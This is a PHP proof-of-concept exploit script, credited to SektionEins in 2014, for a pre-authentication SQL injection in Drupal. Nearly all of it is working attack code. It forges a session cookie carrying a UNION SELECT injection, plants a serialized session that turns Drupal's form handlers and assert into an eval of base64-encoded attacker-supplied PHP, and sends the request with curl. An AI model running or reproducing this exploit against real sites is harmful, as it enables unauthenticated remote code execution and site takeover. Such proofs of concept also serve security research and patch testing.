//    _____      __   __  _             _______
//   / ___/___  / /__/ /_(_)___  ____  / ____(_)___  _____
//   \__ \/ _ \/ //_/ __/ / __ \/ __ \/ __/ / / __ \/ ___/
//  ___/ /  __/ ,< / /_/ / /_/ / / / / /___/ / / / (__  )
// /____/\___/_/|_|\__/_/\____/_/ /_/_____/_/_/ /_/____/
// Poc for Drupal Pre Auth SQL Injection - (c) 2014 SektionEins
//
// created by Stefan Horst <stefan.horst@sektioneins.de>
//        and Stefan Esser <stefan.esser@sektioneins.de>
//Â·
 
include &#039;common.inc&#039;;
include &#039;password.inc&#039;;
 
// set values
$user_id = 0;
$user_name = &#039;&#039;;
 
$code_inject = &#039;phpinfo();session_destroy();die("");&#039;;
 
$url = isset($argv[1])?$argv[1]:&#039;&#039;;
$code = isset($argv[2])?$argv[2]:&#039;&#039;;
 
if ($url == &#039;-h&#039;) {
      echo "usage:\n";
      echo $argv[0].&#039; $url [$code|$file]&#039;."\n";
      die();
}
 
if (empty($url) || strpos($url,&#039;https&#039;) === False) {
      echo "please state the cookie url. It works only with https urls.\n";
      die();
}
 
if (!empty($code)) {
      if (is_file($code)) {
              $code_inject = str_replace(&#039;<&#039;.&#039;?&#039;,&#039;&#039;,str_replace(&#039;<&#039;.&#039;?php&#039;,&#039;&#039;,str_replace(&#039;?&#039;.&#039;>&#039;,&#039;&#039;,file_get_contents($code))));
      } else {
              $code_inject = $code;
      }
}
 
$code_inject = rtrim($code_inject,&#039;;&#039;);
$code_inject .= &#039;;session_destroy();die("");&#039;;
 
if (strpos($url, &#039;www.&#039;) === 0) {
      $url = substr($url, 4);
}
 
$_SESSION= array(&#039;a&#039;=>&#039;eval(base64_decode("&#039;.base64_encode($code_inject).&#039;"))&#039;,&#039;build_info&#039; => array(), &#039;wrapper_callback&#039; => &#039;form_execute_handlers&#039;, &#039;#Array&#039; => array(&#039;array_filter&#039;), &#039;string&#039; => &#039;assert&#039;);
$_SESSION[&#039;build_info&#039;][&#039;args&#039;][0] = &$_SESSION[&#039;string&#039;];
 
list( , $session_name) = explode(&#039;://&#039;, $url, 2);
 
// use insecure cookie with sql inj.
$cookieName = &#039;SESS&#039; . substr(hash(&#039;sha256&#039;, $session_name), 0, 32);
$password = user_hash_password(&#039;test&#039;);
 
$session_id = drupal_random_key();
$sec_ssid = drupal_random_key();
 
$serial = str_replace(&#039;}&#039;,&#039;CURLYCLOSE&#039;,str_replace(&#039;{&#039;,&#039;CURLYOPEN&#039;,"batch_form_state|".serialize($_SESSION)));
$inject = "UNION SELECT $user_id,&#039;$user_name&#039;,&#039;$password&#039;,&#039;&#039;,&#039;&#039;,&#039;&#039;,null,0,0,0,1,null,&#039;&#039;,0,&#039;&#039;,null,$user_id,&#039;$session_id&#039;,&#039;&#039;,&#039;127.0.0.1&#039;,0,0,REPLACE(REPLACE(&#039;".$serial."&#039;,&#039;CURLYCLOSE&#039;,CHAR(".ord(&#039;}&#039;).")),&#039;CURLYOPEN&#039;,CHAR(".ord(&#039;{&#039;).")) -- ";
 
$cookie = $cookieName.&#039;[test+&#039;.urlencode($inject).&#039;]=&#039;.$session_id.&#039;; &#039;.$cookieName.&#039;[test]=&#039;.$session_id.&#039;; S&#039;.$cookieName.&#039;=&#039;.$sec_ssid;
 
$ch = curl_init($url);
 
curl_setopt($ch,CURLOPT_HEADER,True);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,True);
curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,False);
curl_setopt($ch,CURLOPT_USERAGENT,&#039;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Gecko/20100101 Firefox/34.0&#039;);
 
curl_setopt($ch,CURLOPT_HTTPHEADER,array(
      &#039;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#039;,
      &#039;Accept-Language: en-US,en;q=0.5&#039;
));
 
curl_setopt($ch,CURLOPT_COOKIE,$cookie);
 
$output = curl_exec($ch);
 
curl_close($ch);
 
echo $output;

